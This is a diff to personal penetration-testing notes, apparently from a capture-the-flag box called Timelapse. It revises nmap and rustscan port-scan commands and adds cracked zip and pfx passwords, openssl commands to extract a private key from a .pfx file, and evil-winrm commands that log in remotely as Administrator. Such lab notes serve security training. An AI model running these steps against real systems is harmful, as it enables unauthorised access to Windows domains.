@@ -29,7 +29,7 @@ TCPports=$(sudo nmap -Pn -p- -T4 $TARGET -oA nmap/TCPports -v | egrep "^[0-9]{2,
 
 TCPports=$(rustscan -a $TARGET -r 1-65535 > nmap/TCPports.txt | egrep  "^Open.*$" | sed -e 's/\x1b\[[0-9;]*m//g' | sed -e 's/^Open.*://g;s/\r$//g;s/\[m//g' | tr "\n" "," | sed 's/,$//' ) && echo $TCPports
 
-UDPports=$(sudo nmap -T5 -Pn -sU $TARGET -> nmap/UDPports.txt -v | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $UDPports
+UDPports=$(sudo nmap -T5 -Pn -sU $TARGET -oA nmap/UDPports -v | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $UDPports
 
 
 
@@ -81,4 +81,20 @@ Versions?
 Paths of URL?
 
 Known CVE
+
+zip:supremelegacy  
+
+commonName=dc01.timelapse.htb
+DC=timelapse,DC=htb
+
+
+pfx
+thuglegacy
+
+Extract Certifcate + private key
+openssl pkcs12 -in datei.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in datei.pfx -nokeys -out cert.pem
+
+'evil-winrm -i <IP> -k file.key -c file.crt -S -r timelapse'
+evil-winrm -i $TARGET -k legacyy_dev_auth.pfx -u 'Administrator' -p 'thuglegacy'
 
